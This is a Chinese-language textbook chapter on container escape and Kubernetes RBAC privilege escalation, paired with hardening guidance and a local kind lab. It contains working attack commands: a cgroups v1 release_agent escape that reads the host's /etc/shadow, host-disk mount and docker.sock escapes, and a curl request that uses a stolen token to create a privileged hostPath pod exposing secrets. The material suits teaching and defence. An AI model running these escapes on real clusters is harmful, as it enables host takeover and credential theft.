# 第 17 章：容器隔離與 Kubernetes 權限提升

日常開發中，容器常被當成「輕量級虛擬機」：每個 Pod 有獨立的檔案系統、獨立的 IP 位址、獨立的行程清單，看起來天生就有安全邊界。

但標準 Linux 容器在核心層根本不是虛擬機，它只是一組套了過濾視圖與資源配額的普通 Linux 行程。同一台 Worker Node 上所有以原生 Linux 行程跑的容器（不含採用 MicroVM 或獨立客體核心的沙箱執行時期），底層都共用同一份 Linux 核心與系統呼叫介面。

在 Kubernetes 叢集內，預設自動掛載的 ServiceAccount 憑證與鬆散的 RBAC 規則，更讓低權限工作負載能直接向控制平面發起橫向移動。本章就從作業系統核心原語出發，拆解容器隔離的真實邊界、常見逃逸手法，以及 **NexusPay** Kubernetes 叢集（`nexuspay-worker`、`nexuspay-ingress`）裡的隱蔽提權路徑。

---

## 從你已知的出發

為什麼一個連 `root` 都不需要、在 RBAC 裡也只被允許在單一 Namespace 建立普通 Pod（`pods/create`）的邊緣 Worker 容器，一旦遭到遠端程式碼執行（RCE），卻能在幾分鐘內反過來拿下整座 Kubernetes 叢集的 `cluster-admin` 最高控制權？

因為容器與宿主機之間沒有 Hypervisor 硬體虛擬化層，所謂的容器隔離，只是容器執行時期在啟動行程時透過 `clone(2)` 或 `unshare(2)` 切出 Namespace 視圖、用 `pivot_root(2)`（或 `chroot(2)`）切換根檔案系統，再放進配置好資源控制器的 cgroup。這道防線只在非 `root` 執行、拔除多餘 Capabilities、套用 `seccomp-bpf` 白名單且未掛載宿主敏感路徑時才守得住；一旦拿到 `privileged: true`、`CAP_SYS_ADMIN`、`hostPath`，或利用 ServiceAccount Token 開出特權 Pod，隔離就會當場瓦解。

---

## 機制與推導

### 攻擊者目標與實質影響

當攻擊者透過前幾章的應用程式漏洞（例如命令注入、反序列化 RCE 或 SSRF）在容器裡拿到初步執行權限後，絕對不會只滿足於待在受限的單一 Pod 裡。他們在容器與 Kubernetes 環境追求的目標分為三個層次：

第一層是**容器逃逸至宿主節點**（Node Compromise）。只要突破容器邊界在 Worker Node 上拿到 `root` 權限，就能直接讀取同一台節點上所有其他 Pod 的記憶體、環境變數與掛載密鑰。在 NexusPay 場景裡，這代表一個低風險的外部服務被打穿後，攻擊者能直接從同節點撈出結算引擎的資料庫密碼與 JWT 簽章私鑰。

第二層是**控制平面接管**（Cluster-Admin Escalation）。攻擊者會讀取容器內自動掛載的 ServiceAccount Token 去打 Kubernetes API Server，順著過度寬鬆的 RBAC 權限鏈橫向移動或往上提權到 `cluster-admin`。拿下控制平面後，就能竄改 `Ingress` 路由劫持所有入站交易流量、在每台節點植入後門 `DaemonSet`，或一把讀光全叢集的 `Secret`。

第三層則是當作**跨層攻擊鏈跳板**。拿下宿主節點後，攻擊者可以直接從節點打雲端中繼資料服務，偷走節點綁定的雲端 IAM Role（見第 18 章）；如果容器權限鎖得很緊，他們也能反過來尋找 Linux 核心記憶體漏洞完成本地提權與逃逸（見第 27 章）。

---

### Linux 容器隔離原語：Namespaces、cgroups、Capabilities 與 seccomp-bpf

容器的隔離能力是由四個核心機制拼起來的：Namespace 管「能看見什麼」、cgroups 管「能用多少資源」、Capabilities 拆細了「能做哪些特權操作」，而 seccomp-bpf 則是守在核心入口的「系統呼叫過濾網」。只要其中一環鬆動，就會露出對應的逃逸破口。

#### 1. Namespaces：視圖隔離與全域核心盲區

Linux 核心用 8 種 Namespace 限制行程的視野。最常碰到的是隔離檔案系統掛載點的 `mnt`（搭配 `pivot_root` 取代傳統 `chroot`，防止相對路徑跳脫）、把容器初始行程編號重映射為 `PID 1` 的 `pid`，以及隔離網卡、路由表、`iptables` 與通訊埠的 `net`。

其他五種則是 `ipc`（行程間通訊）、`uts`（主機名稱）、`user`（UID/GID 映射）、`cgroup`（路徑視圖），以及允許調整單調與開機時鐘偏移量（`CLOCK_MONOTONIC` / `CLOCK_BOOTTIME`）的 `time`（牆上時間 `CLOCK_REALTIME` 依然全機共用）。

但看容器安全時，最要命的盲區是：**Linux 核心裡有大量全域子系統根本不屬於任何 Namespace。**

比如核心模組載入介面、核心訊息環形緩衝區（`dmesg`），以及 `/proc/sys` 底下大量沒做命名空間隔離的核心參數，全都是改一處就影響整台宿主機。至於容器能看到並操作哪些 `/dev` 裝置節點，則看掛載設定、執行時期配置與 cgroup 裝置控制器怎麼鎖；一旦容器在 `mnt` Namespace 裡有辦法重新掛載宿主裝置，或是拿到了寫入全域 `/proc/sys` 的權限，單靠視圖隔離根本擋不住跨界寫入。

#### 2. cgroups：資源配額與 `release_agent` 經典逃逸

`cgroups`（Control Groups）負責限制行程群組能用多少 CPU 時間片、記憶體上限（本章模型採用 `x86_64` 基本記憶體分頁大小 `4 KiB`，實際計費與回收粒度視核心版本與頁類型而定）以及最大行程數（`pids.max`），用來防止單一容器把整台機器的資源吃光。

然而在 `cgroups v1` 架構下，核心有一個釋放通知機制：`notify_on_release` 與 `release_agent`。只要某個 cgroup 把 `notify_on_release` 設為 `1` 並填好頂層的 `release_agent`，當這個 cgroup 裡最後一個行程結束（且沒有殘留子 cgroup）時，**宿主機的 Linux 核心**就會親自以 `root` 身分，在宿主命名空間執行 `release_agent` 檔案裡寫的那支宿主路徑程式。

要觸發這條逃逸需要兩個前置條件：第一，容器在初始 User Namespace 擁有 `CAP_SYS_ADMIN` 或 `privileged`，且在 `cgroups v1` 環境沒被 `seccomp` 擋掉 `mount -t cgroup`；第二，攻擊者能從容器內的 `/proc/mounts` 讀出 OverlayFS `upperdir=`，算出容器可寫層在宿主機上的真實路徑。滿足條件時，短短幾行指令就能讓核心幫忙開後門：

```bash
# 1. 在容器內掛載 rdma (或 memory) cgroup v1 控制器並建立子群組
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release

# 2. 從 /proc/mounts 抓出容器可寫層在宿主機上的真實路徑 (upperdir)
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /proc/mounts)
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# 3. 寫入要在宿主機執行的腳本，並讓一個短命行程進入子 cgroup 後立刻退出
printf '#!/bin/sh\ncat /etc/shadow > %s/output\n' "$host_path" > /cmd && chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

最後一行 `sh -c` 結束的瞬間，`/tmp/cgrp/x` 裡的行程數歸零，宿主核心立刻以 `root` 執行 `$host_path/cmd`，把宿主機的 `/etc/shadow` 乖乖寫回容器根目錄下的 `/output`。現代環境升級到純 `cgroups v2` 後已經拔掉了 `release_agent` 介面，從機制上徹底消滅了這條經典逃逸路線。

#### 3. Capabilities：拆分超級使用者的位元遮罩

傳統 Unix 把所有特權都綁在 `UID 0`（`root`）身上；Linux Capabilities 則把特權拆成 41 個獨立位元（bit `0` 到 `40`），記錄在 `/proc/<pid>/status` 的五個 64 位元十六進位遮罩裡（`CapInh`、`CapPrm`、`CapEff`、`CapBnd`、`CapAmb`）。容器執行時期預設只留約 14 個低風險權限（像綁定低號埠的 `CAP_NET_BIND_SERVICE`、改檔案擁有者的 `CAP_CHOWN`），其他全部拔掉。

在做容器配置審計時，只要看到下面這三個 Capability 被打開，就要立刻拉警報：

第一個是 **`CAP_SYS_ADMIN`**（Bit 21，遮罩 `0x0000000000200000`），它幾乎就是「新 `root`」。裡面包山包海塞了 `mount(2)`、`umount(2)`、`setns(2)`、`unshare(2)`、`quotactl(2)` 等幾十種系統管理操作。只要容器在初始 User Namespace 拿到 `CAP_SYS_ADMIN`，而且沒被 `seccomp`、cgroups 版本或裝置政策擋住，攻擊者就能重新掛載 `cgroup v1` 觸發剛剛看過的 `release_agent` 逃逸，或是直接掛載看得到的宿主裝置。

第二個是 **`CAP_DAC_READ_SEARCH`**（Bit 2，遮罩 `0x0000000000000004`），它允許行程直接跳過檔案讀取與目錄搜尋的自主存取控制（DAC）檢查。在著名的 `shocker` 逃逸手法中，如果容器沒被 `seccomp` 封鎖 `open_by_handle_at(2)` 系統呼叫，攻擊者就能拿已知或暴力猜測的底層檔案系統 handle（例如利用掛載參考點與 `EXT4` 根目錄固定為 inode `2` 的特性構造出合法的 `file_handle`），完全繞過 `mnt` Namespace 的目錄樹限制，直接打開宿主機上的敏感檔案。

第三個是 **`CAP_BPF`**（Bit 39，遮罩 `0x0000008000000000`），負責把一部分 eBPF 程式載入與 Map 操作權限從 `CAP_SYS_ADMIN` 拆出來。如果容器被授予 `CAP_BPF`，再搭配 `CAP_PERFMON` 或 `CAP_SYS_ADMIN` 取得掛載追蹤型程式（kprobe、tracepoint、uprobe）的權限，攻擊者就能在核心掛上自訂的 eBPF 探針，直接偷看同節點上其他容器走過核心或共用函式庫的系統呼叫參數與記憶體緩衝區。

#### 4. seccomp-bpf：系統呼叫層的最後一道濾網

`x86_64` 架構的 Linux 核心有超過 300 個系統呼叫，但一般後端服務只需要用到其中幾十個。`seccomp-bpf` 的做法，就是在核心裡載入一段 BPF 位元組碼；每當行程發出系統呼叫、還沒真正進到核心處理函式之前，先攔下來檢查 `struct seccomp_data`（裡面有系統呼叫編號 `nr`、CPU 架構 `arch` 以及前 6 個暫存器參數 `args[6]`）。

Docker 與 containerd 內建的 `RuntimeDefault` seccomp 設定檔採用白名單原則，預設會把幾十個高風險系統呼叫直接擋掉（通常回傳 `EPERM`）。像是前面提過用來逃逸的 `open_by_handle_at`、用來重掛載檔案系統的 `mount` / `umount2` / `pivot_root`、用來載入核心程式或模組的 `bpf` / `kexec_load` / `init_module`，以及搭配特定旗標（如 `CLONE_NEWUSER`）會打開非特權命名空間提權面的 `unshare` 與 `clone`，都在封鎖名單內。

但 Kubernetes 有個很容易踩到的預設陷阱：如果 Pod 的 YAML 沒明確寫出 `seccompProfile`，而且節點上的 kubelet 也沒開啟 `SeccompDefault`，**這個 Pod 實際跑起來的 seccomp 狀態就會是完全不設防的 `Unconfined`**。除非叢集啟用了 Pod Security Admission 的 `restricted` 模式在建立 Pod 時直接退件，否則一旦處於 `Unconfined`，上面那道系統呼叫過濾網就等於根本沒開。

---

### 容器逃逸四大高危設定與機制推導

看懂底層的隔離機制後，我們回頭檢查 NexusPay 的 Kubernetes YAML 設定檔。只要任何一個 Pod 出現以下四種寫法，就等於替攻擊者留了逃逸後門：

```yaml
# 集齊四大逃逸破口的危險 Pod 範例
apiVersion: v1
kind: Pod
metadata:
  name: dangerous-agent
spec:
  hostPID: true          # 破口 4a: 共享宿主行程樹 (/proc/<host_pid>)
  hostNetwork: true      # 破口 4b: 共享宿主網路介面與 127.0.0.1 迴路
  containers:
    - name: agent
      image: alpine:3.20
      securityContext:
        privileged: true # 破口 1: 解除所有隔離並暴露 /dev 宿主磁碟
      volumeMounts:
        - name: dockersock
          mountPath: /var/run/docker.sock # 破口 2: 掛入容器引擎 Socket
        - name: hostproc
          mountPath: /host-proc           # 破口 3: 掛入宿主 /proc
```

第一個破口是 **`securityContext.privileged: true`**。這絕不只是「在容器裡用 root 跑」而已，它是命令容器執行時期把所有防護罩全拆了：給滿全部的 `CapEff` 位元遮罩、關掉 `seccomp` 與 AppArmor/SELinux 限制，還把宿主機完整的 `/dev` 裝置樹直接塞進容器裡。

攻擊者進到這種容器，只要跑一下 `fdisk -l` 找到宿主機磁碟分割區（比如 `/dev/nvme0n1p1`），接著執行 `mkdir /mnt/host && mount /dev/nvme0n1p1 /mnt/host`，整顆宿主機硬碟就任他讀寫，想改 `/etc/cron.d` 或塞 SSH 公鑰都行。

第二個破口是用 **`hostPath` 掛載容器引擎 Socket**（像 `/var/run/docker.sock` 或 `/run/containerd/containerd.sock`），這在 CI/CD Runner 或監控代理 Pod 超級常見。因為宿主機上的容器 Daemon 本身是以 `root` 執行的，而且它的 Unix Domain Socket 預設不會細分客戶端權限；容器裡的攻擊者只要用 `curl --unix-socket /var/run/docker.sock` 或 `ctr` 指令，叫 Daemon 再開一個設定了 `privileged: true` 並掛載宿主 `/` 目錄的新容器，兩步就能接管宿主機。

第三個破口是用 **`hostPath` 掛載宿主 `/proc`，或讓容器能寫入 `/proc/sys/kernel/core_pattern`**。當 Linux 上有任何一個行程崩潰、進入產生 Core Dump 的流程時，核心會去讀全域的 `/proc/sys/kernel/core_pattern`。

如果這個檔案的內容是以管線符號 `|` 開頭（例如 `|/tmp/payload.sh`），核心就會直接在**宿主機的初始命名空間、以核心 `root` 權限**啟動後面那支程式。攻擊者只要能寫入宿主的 `core_pattern`，把路徑指到宿主檔案系統看得到的惡意腳本，接著在容器裡隨便讓一個小程式觸發 `SIGSEGV` 崩潰，宿主機核心就會乖乖幫他執行後門。

第四個破口則是 **`hostPID: true` 與 `hostNetwork: true`**。開了 `hostPID: true`，容器就會跟宿主機共用同一個 PID Namespace，宿主機上所有行程都會直接出現在容器的 `/proc/<host_pid>` 底下。

如果這時容器又是 `root` 且握有對應權限（例如有 `CAP_SYS_PTRACE` 能跨行程 `ptrace`，或有 `CAP_DAC_READ_SEARCH` 能讀檔，且沒被 Yama、AppArmor 或 SELinux 攔住），攻擊者就能直接從 `/proc/<host_pid>/root` 摸進宿主檔案系統、偷看 `/proc/<host_pid>/environ` 裡的機密環境變數，甚至用 `ptrace` 把惡意指令注入宿主高權限行程。而 `hostNetwork: true` 則是把宿主的網路命名空間直接交出來，讓容器不但能監聽宿主網卡流量，還能直接打宿主機綁在 `127.0.0.1` 的內部管理 API。

---

### Kubernetes ServiceAccount 與 RBAC 隱蔽提權鏈

就算容器本身沒開 `privileged`，也沒有任何核心漏洞可以利用，攻擊者還是能走另一條路：順著 Kubernetes 的身分與 RBAC 授權控制平面往上爬。

#### ServiceAccount Token 自動掛載機制

在預設設定下，Kubernetes 會幫每個 Namespace 建一個 `default` ServiceAccount，而且每當你建立 Pod 時，它就會透過投射磁碟區（Projected Volume）自動把認證憑證掛到容器裡的 `/var/run/secrets/kubernetes.io/serviceaccount/token`（同目錄下還有 `ca.crt` 跟 `namespace`）。

雖然現代 Kubernetes 已經改用 `TokenRequest` API，簽發綁定 Pod 生命週期且有時效性（常見預設請求期限為 `3600 s`，由 kubelet 定期自動續簽）的 Bound ServiceAccount Token 來取代早年的永久靜態 Token。但只要你沒把自動掛載關掉（Pod 層級的 `automountServiceAccountToken` 優先於 ServiceAccount 層級，兩邊都沒設為 `false` 時預設就是自動掛載），一旦容器裡的應用程式被攻破，攻擊者隨手一個 `cat` 就能拿到當下有效的 JWT，直接去敲 API Server 的大門。

#### RBAC 隱蔽提權原語

檢查 Kubernetes RBAC 設定時，如果只用關鍵字搜 `cluster-admin` 或萬用字元 `*`，會漏掉一大票致命的提權跳板。實戰中，下面這四組權限組合本身就是提權原語：

第一組是 **`pods/create`**（包含對 `deployments`、`daemonsets`、`statefulsets`、`cronjobs` 的 `create`、`update` 或 `patch`）。只要叢集沒有額外的准入政策攔截，一個能建立 Pod 的身分，就可以在同一個 Namespace 的新 Pod 裡指定掛載其他更高權限的 `spec.serviceAccountName`（只要那個目標 SA 沒關掉 Token 自動投射，就能直接借殼取證）。更狠的是，如果連 Pod Security Admission 都沒開，他可以直接開一個掛了 `hostPath: /` 或 `privileged: true` 的惡意 Pod，原地逃逸到宿主節點。

第二組是 **`impersonate`**（針對 `users`、`groups` 或 `serviceaccounts`）。只要某個身分擁有對特定目標的 `impersonate` 動詞，他在打 API Server 時只要在 HTTP 請求加上 `Impersonate-User: <user>` 標頭（如果同時有群組模擬權限，還能加上 `Impersonate-Group: system:masters`），API Server 就會直接讓他化身成那個高權限身分來執行操作。

第三組是針對 `roles` 或 `clusterroles` 的 **`bind` 與 `escalate`**（需搭配建立或修改 Binding 物件的權限）。為了防止權限無中生有，Kubernetes RBAC 預設禁止你把「自己手上沒有的權限」發給別人；但如果某個角色被給了 `escalate` 動詞（加上 `create` 或 `update`），這道限制就被解開了，他可以自己捏出一個擁有任意超額權限的角色。

同樣地，如果他對某個高權限 `ClusterRole`（比如 `cluster-admin`）擁有 `bind` 動詞，手頭又有 `clusterrolebindings`（全叢集範圍）或 `rolebindings`（單一 Namespace 範圍）的 `create` 權限（或是能 `patch` / `update` 一個已經綁了該角色的既有 Binding 來把自己的 `subjects` 加進去；注意既有 Binding 的 `roleRef` 是不可改的），他就能合法把高權限大衣披到自己身上。

第四組則是大家熟知的 **`secrets/get`、`secrets/list` 與 `pods/exec`**。只要角色沒有用 `resourceNames` 鎖死特定名稱，拿到 `secrets/get` 或 `secrets/list` 就等於能把授權範圍（單一 Namespace 或全叢集）內所有 `Secret` 裡的資料庫密碼與 TLS 私鑰搬光；而拿到 `pods/exec`，則能直接跳進同範圍內的其他高權限 Pod 裡下指令，偷走對方的 Bound Token 或記憶體裡的金鑰。

#### Worked Example：NexusPay 5 × 4 RBAC 權限圖 3 階段提權推導

我們在檢查 NexusPay 叢集時，抓出了一份包含 **5 個 ServiceAccount** 與 **4 條 RoleBinding / ClusterRoleBinding** 的權限配置快照。

這個演練場景有兩個環境前提：第一，`nexuspay-prod` 這個 Namespace 沒有套用任何阻擋特權 Pod 的准入限制（沒開 Pod Security Admission 的 `restricted` 模式，也沒掛外部准入 Webhook）；第二，目標 Worker Node 上剛好也跑著一個掛載了 `cluster-admin-sa`（位於 `kube-system`）的系統管理代理 Pod（或者這台節點本身就是 `kind` 單節點控制平面）。

現在假設攻擊者已經透過應用層漏洞，在 `nexuspay-worker` Pod 裡拿到 Shell，手上握著 `worker-sa` 的身分。我們來一步步推導，他怎麼靠著看似無害的 `pods/create` 走完 3 階段提權，最終拿下 `Cluster-Admin`：

```text
[NexusPay RBAC 權限圖：5 ServiceAccounts × 4 Bindings]
[環境前提：nexuspay-prod 無准入控制阻擋特權 Pod；目標節點上運行掛載 cluster-admin-sa 的系統 Pod]

ServiceAccounts (5):
  SA1: worker-sa        (ns: nexuspay-prod)  <-- 攻擊者初始立足點
  SA2: ingress-sa       (ns: nexuspay-prod)
  SA3: deploy-sa        (ns: nexuspay-ops)
  SA4: backup-sa        (ns: nexuspay-ops)
  SA5: cluster-admin-sa (ns: kube-system)

RoleBindings / ClusterRoleBindings (4):
  B1: rb-worker-pod-mgr (ns: nexuspay-prod)
      └─ worker-sa  ──[pods: get, list, create]──> (ns: nexuspay-prod)
  B2: rb-ingress-net    (ns: nexuspay-prod)
      └─ ingress-sa ──[services, endpoints, ingresses: get, list, watch]──> (ns: nexuspay-prod)
  B3: rb-ops-deploy     (ns: nexuspay-ops)
      └─ deploy-sa  ──[deployments, secrets: *]──> (ns: nexuspay-ops)
  B4: crb-k8s-super     (Cluster-wide)
      └─ cluster-admin-sa ──[*/*: *]──> (Cluster-Admin)

[路徑評估]
  - 純 API 水平路徑（嘗試讀 secret 或跨 ns 至 deploy-sa）：
    worker-sa 無 secrets/get 權限，且 B1 僅限 nexuspay-prod，無法存取 nexuspay-ops -> 死路。
  - 垂直節點逃逸路徑（利用 pods/create 掛載宿主根目錄）：
    條件檢查：nexuspay-prod 未套用 Pod Security Standards (Restricted) 或其他准入阻擋 -> 可行！

[3 階段提權推導]
  Stage 1 [憑證讀取與權限確認]
    - 操作：讀取已投射的 /var/run/secrets/kubernetes.io/serviceaccount/token (worker-sa JWT)
    - 查詢：POST /apis/authorization.k8s.io/v1/selfsubjectrulesreviews
    - 結果：確認具備 nexuspay-prod 內 pods/create (B1)，且環境無 PSS 等准入策略阻擋。

  Stage 2 [透過 pods/create 掛載節點根目錄完成逃逸]
    - 操作：以 worker-sa Token 向 API Server 發送 POST /api/v1/namespaces/nexuspay-prod/pods
    - Payload 關鍵欄位：
        spec.containers[0].securityContext.privileged = true
        spec.volumes[0].hostPath.path = "/"  (掛載至容器內 /host)
    - 結果：排程器將 Pod 調度至目標節點，容器啟動指令讀取 /host 取得宿主節點 root 檔案系統存取權。

  Stage 3 [讀取節點高權限憑證接管 Cluster-Admin]
    - 操作：由該特權容器於宿主節點檔案系統讀取同節點上 cluster-admin-sa 系統 Pod 的掛載目錄：
            /host/var/lib/kubelet/pods/<sys-pod-uid>/volumes/kubernetes.io~projected/kube-api-access-*/token
            (若該節點兼任控制平面，亦可直接讀取 /host/etc/kubernetes/admin.conf)
    - 結果：以取得的 cluster-admin-sa 憑證向 API Server 發起請求，驗證 kubectl auth can-i '*' '*' -> yes，
            完成從 worker-sa 到 Cluster-Admin (B4) 的 3 階段提權鏈。
```

這張圖點破了一個很多團隊會忽略的真相：**Kubernetes RBAC 的權限邊界，跟底層 Linux 節點的容器隔離邊界是死死綁在一起的。**

表面上看，`worker-sa` 既不能讀 Secret，也跨不出 `nexuspay-prod` 這個 Namespace，權限好像鎖得很小。但只要 RBAC 給了 `pods/create`，而 API Server 入口又沒擋掉 `privileged` 或 `hostPath`，攻擊者就能靠「開一個特權 Pod」直接往下鑿穿宿主節點；只要那台節點上剛好躺著高權限系統 Pod 的投射 Token 或控制平面設定檔，整座叢集就跟著一併淪陷。

---

## 故障模式與防禦

理解了 RBAC 與底層容器隔離如何互相牽動，我們就能看清常見的設定盲點。只靠單一開關（比如「把容器改成非 `root`」）是擋不住複合攻擊鏈的，必須把下面五道防線同時鎖緊：

| 故障模式（危險設定） | 攻擊者怎麼利用 | 真正能鎖死邊界的防線 |
|---|---|---|
| 自動掛載 `ServiceAccount` Token（預設開啟） | 拿到 RCE 後直接讀 `/var/run/secrets/.../token` 去打 API Server 探路 | 只要服務不需要呼叫 K8s API，一律在 SA 與 Pod 兩層都設 `automountServiceAccountToken: false` |
| 開啟 `privileged: true` 或留著多餘 Capabilities | 直接掛載宿主硬碟、操作 `cgroups v1` `release_agent`，或靠 `CAP_DAC_READ_SEARCH` 偷讀宿主檔案 | 強制設為 `privileged: false`、`allowPrivilegeEscalation: false`，並加上 `capabilities.drop: ["ALL"]` |
| 沒設 `seccompProfile` 且節點沒開 `SeccompDefault`（變成 `Unconfined`） | 呼叫 `open_by_handle_at`、`bpf`、`unshare` 等高風險系統呼叫直接打核心 | 明確指定 `seccompProfile.type: RuntimeDefault`（或針對服務量身打造最小化的 `Localhost` 白名單） |
| 用 `hostPath` 掛載 `/`、`/proc` 或 `docker.sock` | 透過宿主目錄或容器引擎 Socket 開特權容器，或改寫 `core_pattern` 讓核心幫跑後門 | 一般應用層 Pod 全面禁用 `hostPath`；改用 `emptyDir`、`configMap` 或標準 CSI 儲存驅動 |
| RBAC 給出 `pods/create`、`impersonate`、`bind`/`escalate` | 跳過小角色的限制，開特權 Pod 逃逸或直接把 `cluster-admin` 綁給自己 | Namespace 開啟 PSA `restricted` 擋掉特權 Pod；砍掉非必要的 RBAC 動詞，並用 ValidatingAdmissionPolicy 把關高風險操作 |

### 防禦實作基準：NexusPay 工作負載硬化與 PSS Restricted

從 Kubernetes 1.25 開始，內建的 **Pod Security Admission**（PSA）正式取代了舊版的 PodSecurityPolicy，只要在 Namespace 貼上標籤，就能強制執行三種安全等級（`privileged`、`baseline`、`restricted`）。

為了堵死前面 Worked Example 那條提權路，我們必須在 NexusPay 的生產環境 `nexuspay-prod` 直接套用最嚴格的 `restricted` 模式。這樣 API Server 在准入階段就會當場拒絕任何帶有 `privileged: true`、`hostPath`、沒設合規 seccomp（只准 `RuntimeDefault` 或 `Localhost`）或沒關掉權限提升（`allowPrivilegeEscalation != false`）的 Pod。

同時，我們把前面那條過寬的 `rb-worker-pod-mgr` RoleBinding 刪掉，並套用下面這份符合 **PSS Restricted** 的硬化配置：

```yaml
# 1. Namespace 層強制執行 Pod Security Standards (Restricted)
apiVersion: v1
kind: Namespace
metadata:
  name: nexuspay-prod
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/enforce-version: latest
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
---
# 2. 關閉 ServiceAccount 自動掛載（Worker 不需要呼叫 K8s API）
apiVersion: v1
kind: ServiceAccount
metadata:
  name: worker-sa
  namespace: nexuspay-prod
automountServiceAccountToken: false
---
# 3. 硬化後的 nexuspay-worker Deployment 片段
apiVersion: apps/v1
kind: Deployment
metadata:
  name: nexuspay-worker
  namespace: nexuspay-prod
spec:
  replicas: 2
  selector:
    matchLabels:
      app: nexuspay-worker
  template:
    metadata:
      labels:
        app: nexuspay-worker
    spec:
      serviceAccountName: worker-sa
      automountServiceAccountToken: false
      securityContext:
        runAsNonRoot: true
        runAsUser: 10001
        runAsGroup: 10001
        fsGroup: 10001
        seccompProfile:
          type: RuntimeDefault
      containers:
        - name: worker
          image: nexuspay/worker:v2.4.1
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities:
              drop:
                - ALL
          volumeMounts:
            - name: tmp-vol
              mountPath: /tmp
      volumes:
        - name: tmp-vol
          emptyDir: {}
```

至於像 `nexuspay-ingress` 這種真的需要呼叫 K8s API 來監看 `Service` 與 `Endpoints` 變化的元件，防禦原則就是「獨立 Namespace + 最小唯讀 RBAC」。我們把 Ingress Controller 單獨放在自己的 Namespace 裡，不跟結算 Worker 或資料庫密鑰混在一起；而且 RBAC 只給 `services`、`endpoints`、`ingresses` 的 `get`、`list`、`watch` 唯讀權限，絕對不給 `pods/create` 或全叢集的 `secrets/get`。

---

## 動手做

- **難度**：進階
- **預估時間**：60 分鐘

現在我們用本機 Docker 跑一個零雲端費用的 `kind`（Kubernetes in Docker）測試叢集（請先確認本機已安裝 `docker`、`kind` v0.20+ 與 `kubectl`），把弱化版的 NexusPay 部署上去，親手走一遍從讀取 ServiceAccount Token、利用 `pods/create` 開特權 Pod 偷密鑰與摸宿主機，再到套用 PSS `restricted` 當場攔截的完整攻防流程。

### 步驟 1：建立本地 `kind` 叢集與弱化版 NexusPay 環境

把下面這份帶有漏洞的環境定義存成 `nexuspay-vuln.yaml`，裡面建好了 `nexuspay-prod` Namespace、裝著帳本資料庫密碼的 `nexuspay-db-secret`、擁有 `pods/create` 權限的 `worker-sa`，以及沒關掉 Token 自動掛載的 `nexuspay-worker` Pod：

```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: nexuspay-prod
---
apiVersion: v1
kind: Secret
metadata:
  name: nexuspay-db-secret
  namespace: nexuspay-prod
type: Opaque
stringData:
  DB_DSN: "postgres://nexuspay:S3cr3tPassw0rd!@10.0.1.50:5432/ledger"
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: worker-sa
  namespace: nexuspay-prod
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: worker-pod-launcher
  namespace: nexuspay-prod
rules:
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["get", "list", "create"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: rb-worker-pod-mgr
  namespace: nexuspay-prod
subjects:
  - kind: ServiceAccount
    name: worker-sa
    namespace: nexuspay-prod
roleRef:
  kind: Role
  name: worker-pod-launcher
  apiGroup: rbac.authorization.k8s.io
---
apiVersion: v1
kind: Pod
metadata:
  name: nexuspay-worker
  namespace: nexuspay-prod
spec:
  serviceAccountName: worker-sa
  containers:
    - name: worker
      image: alpine:3.20
      command: ["sh", "-c", "apk add --no-cache curl && sleep 3600"]
```

執行下面三行指令把叢集與 Pod 跑起來：

```bash
kind create cluster --name nexuspay-lab
kubectl apply -f nexuspay-vuln.yaml
kubectl wait --for=condition=Ready pod/nexuspay-worker -n nexuspay-prod --timeout=60s
```

### 步驟 2：進到 `nexuspay-worker` 偷 Token 並靠 `pods/create` 提權

現在模擬攻擊者已經在 `nexuspay-worker` 裡拿到 RCE。我們用 `kubectl exec` 進去，拿容器裡自動掛載的 Token 直接打 K8s API。

先試著直接讀 `nexuspay-db-secret`（會被 RBAC 擋下來），接著改用 `pods/create` 建立一個同時把 `nexuspay-db-secret` 掛進環境變數、又用 `hostPath` 把宿主節點根目錄 `/` 掛到 `/host` 的特權 Pod：

```bash
# 1. 先確認 worker-sa 無法直接讀取 secrets (預期回傳 "reason": "Forbidden")
kubectl exec -n nexuspay-prod nexuspay-worker -- sh -c '
  TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
  curl -s -k -H "Authorization: Bearer $TOKEN" \
    https://kubernetes.default.svc/api/v1/namespaces/nexuspay-prod/secrets/nexuspay-db-secret | grep -E "status|reason"
'

# 2. 利用 pods/create 權限建立一個掛載該 Secret 與 hostPath 的惡意 Pod
kubectl exec -n nexuspay-prod nexuspay-worker -- sh -c '
  TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
  curl -s -k -X POST -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    https://kubernetes.default.svc/api/v1/namespaces/nexuspay-prod/pods \
    -d "{
      \"apiVersion\": \"v1\",
      \"kind\": \"Pod\",
      \"metadata\": {\"name\": \"evil-escalate-pod\", \"namespace\": \"nexuspay-prod\"},
      \"spec\": {
        \"containers\": [{
          \"name\": \"pwn\",
          \"image\": \"alpine:3.20\",
          \"command\": [\"sh\", \"-c\", \"echo DB=\$DB_DSN && ls /host/etc/kubernetes && sleep 300\"],
          \"securityContext\": {\"privileged\": true},
          \"envFrom\": [{\"secretRef\": {\"name\": \"nexuspay-db-secret\"}}],
          \"volumeMounts\": [{\"name\": \"host-root\", \"mountPath\": \"/host\"}]
        }],
        \"volumes\": [{\"name\": \"host-root\", \"hostPath\": {\"path\": \"/\"}}]
      }
    }" | grep -E "name|status"
'
```

等幾秒鐘讓 `evil-escalate-pod` 跑起來，接著在外面看它的輸出（如果在真實攻擊中 `worker-sa` 沒有 `pods/log` 權限，攻擊者只要把上面 `command` 裡的 `echo` 改成用 `curl` 把資料打回自己的伺服器，或是直接把後門寫進 `/host` 就行了）：

```bash
kubectl logs -n nexuspay-prod evil-escalate-pod
```

### 步驟 3：貼上 PSS Restricted 標籤並鎖緊權限

